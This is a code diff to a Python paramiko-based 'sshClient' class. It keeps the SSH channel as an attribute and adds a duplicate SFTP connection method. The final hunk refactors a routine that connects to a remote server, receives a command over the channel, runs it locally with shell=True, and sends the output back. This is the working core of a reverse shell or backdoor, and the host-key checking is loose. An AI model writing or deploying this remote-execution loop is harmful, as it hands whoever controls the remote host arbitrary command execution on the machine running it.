@@ -13,6 +13,7 @@ class sshClient(object):
     # constructor, sets necessary parameters to establish a SSH tunnel
     def __init__(self,  hostName,  portNumber, userName,  passWord):
         self.SSHClient = None
+        self.channel = None
         self.hostName = hostName
         self.portNumber = portNumber
         self.userName = userName
@@ -31,6 +32,34 @@ class sshClient(object):
 
             self.SSHClient.connect(hostname=self.hostName,  port=self.portNumber,
                                    username=self.userName,  password=self.passWord)
+            self.channel = self.SSHClient.get_transport().open_session()
+            logger.info('SSH Connection Established . . .')
+
+            # handle errors
+        except paramiko.AuthenticationException as authErr:
+            print('Authentication failed:',  authErr)
+        except paramiko.SSHException as sshErr:
+            print('SSH connection failed:',  sshErr)
+        except socket.timeout as toutErr:
+            print('Connection timed out:',  toutErr)
+        except Exception as err:
+            print('Exception has ocurred:',  err)
+            self.SSHClient.close()
+
+    # make a connection to a remote SSH server
+    def makeSFTPConnection(self):
+        try:
+            logger.info("Establishing ssh connection")
+            # create a client instance, auto generate a key
+            # and attempt to connect to a host
+            self.SSHClient = paramiko.SSHClient()
+            self.SSHClient.load_system_host_keys()
+            self.SSHClient.set_missing_host_key_policy(
+                paramiko.WarningPolicy())
+
+            self.SSHClient.connect(hostname=self.hostName,  port=self.portNumber,
+                                   username=self.userName,  password=self.passWord)
+            self.channel = self.SSHClient.get_transport().open_session()
             logger.info('SSH Connection Established . . .')
 
             # handle errors
@@ -100,13 +129,13 @@ class sshClient(object):
         try:
             # connect to SSH server
             self.makeSSHConnection()
-            channel = self.SSHClient.get_transport().open_session()
+
             logger.info("Calling invoke shell")
             logger.info("Invoke shell called")
 
-            command = channel.recv(1024).decode()
+            command = self.channel.recv(1024).decode()
             receivedCommand = subprocess.check_output(command, shell=True)
-            channel.sendall(receivedCommand)
+            self.channel.sendall(receivedCommand)
 
             logger.info(f"Received message{command}")
         except subprocess.CalledProcessError as e:
